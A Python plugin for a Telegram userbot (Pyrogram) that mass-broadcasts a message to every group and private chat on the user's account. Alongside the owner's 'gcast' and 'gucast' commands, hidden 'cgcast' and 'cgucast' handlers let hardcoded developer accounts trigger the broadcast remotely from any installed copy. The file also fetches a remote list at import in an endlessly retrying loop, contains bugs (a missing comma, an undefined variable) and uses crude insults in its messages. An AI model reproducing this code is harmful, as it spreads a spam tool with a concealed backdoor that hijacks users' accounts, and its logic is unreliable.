# Credits: @mrismanaziz
# Copyright (C) 2022 Pyro-ManUserbot
#
# This file is a part of < https://github.com/mrismanaziz/PyroMan-Userbot/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/mrismanaziz/PyroMan-Userbot/blob/main/LICENSE/>.
#
# t.me/SharingUserbot & t.me/Lunatic0de

import asyncio

import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from requests import get

from config import BLACKLIST_GCAST
from config import CMD_HANDLER as cmd
from Uputt.helpers.adminHelpers import DEVS
from Uputt.helpers.basic import edit_or_reply
from Uputt.helpers.misc import HAPP, in_heroku
from Uputt.helpers.tools import get_arg
from Uputt.utils.misc import restart

from .help import add_command_help

while 0 < 6:
    _GCAST_BLACKLIST = get(
        "https://raw.githubusercontent.com/fsbub/rizki/UputtNande/blacklistgcast.json"
    )
    if _GCAST_BLACKLIST.status_code != 200:
        if 0 != 5:
            continue
        GCAST_BLACKLIST = [-1001608701614, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001951726069, -1001944702855, -1001287188817]
    GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
    break

del _GCAST_BLACKLIST


@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gcast", cmd) & filters.me)
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`​ᴋᴀʟᴏ ʟɪᴍɪᴛ, ᴊᴀɴɢᴀɴ ꜱᴀʟᴀʜɪɴ ᴄʟᴇᴏ ʏᴀ!​`")
    else:
        return await message.edit_text("**Pesannya Mana ngentod**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in GCAST_BLACKLIST and chat not in BLACKLIST_GCAST:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.1)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.1)
    await Man.edit_text(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup Ya Tod, Gagal Mengirim Pesan Ke** `{error}` **Grup Nih Tod, Sorry**"
    )


@Client.on_message(filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("gucast", cmd) & filters.me)
async def gucast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        Man = await edit_or_reply(message, "`Limit Jangan Salahin Gua Ya Anjing, Started global broadcast...`")
    else:
        return await message.edit_text("**Pesannya Mana ngentod**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.1)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.1)
    await Man.edit_text(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **chat Nih tod, Gagal Mengirim Pesan Ke** `{error}` **chat Tod, Sorry**"
    )


@Client.on_message(filters.command("blchat", cmd) & filters.me)
async def blchatgcast(client: Client, message: Message):
    blacklistgc = "True" if BLACKLIST_GCAST else "False"
    list = BLACKLIST_GCAST.replace(" ", "\n» ")
    if blacklistgc == "True":
        await edit_or_reply(
            message,
            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `{cmd}addblacklist` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
        )
    else:
        await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")


@Client.on_message(filters.command("addblacklist", cmd) & filters.me)
async def addblacklist(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await message.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
    blacklistgrup = (
        blgc.replace("{", "")
        .replace("}", "")
        .replace(",", "")
        .replace("[", "")
        .replace("]", "")
        .replace("set() ", "")
    )
    await message.edit(
        f"**Berhasil Menambahkan** `{message.chat.id}` **ke daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
    )
    if await in_heroku():
        heroku_var = HAPP.config()
        heroku_var["BLACKLIST_GCAST"] = blacklistgrup
    else:
        path = dotenv.find_dotenv("config.env")
        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
    restart()


@Client.on_message(filters.command("delblacklist", cmd) & filters.me)
async def delblacklist(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Processing...`")
    if HAPP is None:
        return await message.edit(
            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
        )
    gett = str(message.chat.id)
    if gett in blchat:
        blacklistgrup = blchat.replace(gett, "")
        await message.edit(
            f"**Berhasil Menghapus** `{message.chat.id}` **dari daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
        )
        if await in_heroku():
            heroku_var = HAPP.config()
            heroku_var["BLACKLIST_GCAST"] = blacklistgrup
        else:
            path = dotenv.find_dotenv("config.env")
            dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
        restart()
    else:
        await message.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")


add_command_help(
    "broadcast",
    [
        [
            "gcast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)",
        ],
        [
            "gucast <text/reply>",
            "Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)",
        ],
        [
            "blchat",
            "Untuk Mengecek informasi daftar blacklist gcast.",
        ],
        [
            "addblacklist",
            "Untuk Menambahkan grup tersebut ke blacklist gcast.",
        ],
        [
            "delblacklist",
            f"Untuk Menghapus grup tersebut dari blacklist gcast.\n\n  •  **Note : **Ketik perintah** `{cmd}addblacklist` **dan** `{cmd}delblacklist` **di grup yang kamu Blacklist.",
        ],
    ],
)
